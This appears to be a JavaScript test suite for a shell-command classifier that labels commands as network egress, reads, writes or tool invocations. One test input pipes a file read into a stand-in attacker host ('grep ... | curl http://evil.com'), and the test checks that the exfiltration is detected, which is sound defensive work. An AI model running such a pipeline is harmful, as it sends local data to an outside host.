const test = require('node:test');
const assert = require('node:assert/strict');

const {
  classifyShellCommandLine,
  classifyCommandName,
  splitCommandSegments,
  isShellFenceLang
} = require('../src/parser/shell-command-classifier');

test('curl commands classify as external_egress with host targets', () => {
  const wttr = classifyShellCommandLine('curl -s "wttr.in/London?format=3"');
  assert.equal(wttr.length, 1);
  assert.equal(wttr[0].operationType, 'external_egress');
  assert.ok(wttr[0].targets.some(t => t.value === 'wttr.in'));

  const meteo = classifyShellCommandLine('curl -s "https://api.open-meteo.com/v1/forecast?latitude=51.5"');
  assert.equal(meteo[0].operationType, 'external_egress');
  assert.ok(meteo[0].targets.some(t => t.value === 'api.open-meteo.com'));
});

test('file redirects and fs commands classify as write, readers as read', () => {
  assert.equal(classifyShellCommandLine('echo "hi" > .learnings/ERRORS.md')[0].operationType, 'write');
  assert.equal(classifyShellCommandLine('mkdir -p .learnings')[0].operationType, 'write');
  assert.equal(classifyShellCommandLine('grep -h "Status" .learnings/*.md')[0].operationType, 'read');
  assert.equal(classifyShellCommandLine('cat "$1"')[0].operationType, 'read');
});

test('exec-family commands classify as invoke_tool', () => {
  assert.equal(classifyShellCommandLine('git clone https://github.com/x/y.git')[0].operationType, 'invoke_tool');
  assert.equal(classifyShellCommandLine('node scripts/run.js')[0].operationType, 'invoke_tool');
  assert.equal(classifyShellCommandLine('npm install')[0].operationType, 'invoke_tool');
});

test('bare curl/wget to a URL classify as external_egress', () => {
  assert.equal(classifyShellCommandLine('curl https://api.example.com/data')[0].operationType, 'external_egress');
  assert.equal(classifyShellCommandLine('wget http://host.tld/file')[0].operationType, 'external_egress');
});

test('noise / control lines produce no commands', () => {
  // Shell noise that blew up node counts before the whitelist.
  for (const line of ['echo "done"', 'exit 0', ';;', 'esac', 'else', 'fi', 'done',
    'RED=\\033[0;31m', 'contains_error=false', '--dry-run)', '# a comment', 'set -e', 'shift']) {
    assert.equal(classifyShellCommandLine(line).length, 0, `expected no command for: ${line}`);
  }
});

test('compound commands split on pipes and && separators', () => {
  const segs = splitCommandSegments('grep -B5 "high" file.md | grep "^##" && curl http://x.com');
  assert.equal(segs.length, 3);
  const cmds = classifyShellCommandLine('grep "x" a.md | curl http://evil.com');
  assert.ok(cmds.some(c => c.operationType === 'read'));
  assert.ok(cmds.some(c => c.operationType === 'external_egress'));
});

test('classifyCommandName resolves base name and wrappers', () => {
  assert.equal(classifyCommandName('curl', 'curl http://x'), 'external_egress');
  assert.equal(classifyCommandName('/usr/bin/curl', '/usr/bin/curl http://x'), 'external_egress');
  assert.equal(classifyCommandName('echo', 'echo hi'), '');
});

test('isShellFenceLang recognizes shell fence languages only', () => {
  for (const lang of ['bash', 'sh', 'shell', 'console', 'zsh']) {
    assert.equal(isShellFenceLang(lang), true, lang);
  }
  for (const lang of ['js', 'javascript', 'json', 'python', 'ts', '']) {
    assert.equal(isShellFenceLang(lang), false, lang);
  }
});
